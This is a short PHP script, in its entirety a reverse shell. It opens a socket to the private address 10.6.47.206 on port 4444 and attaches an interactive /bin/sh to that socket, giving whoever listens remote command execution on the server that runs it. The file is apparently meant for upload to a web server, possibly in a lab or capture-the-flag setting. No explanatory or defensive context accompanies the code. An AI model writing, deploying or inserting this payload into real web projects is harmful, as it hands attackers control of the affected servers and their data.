<?php

$ip = '10.6.47.206';
$port = 4444;


$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', [
  0 => $sock,
  1 => $sock,
  2 => $sock
], $pipes);
?>
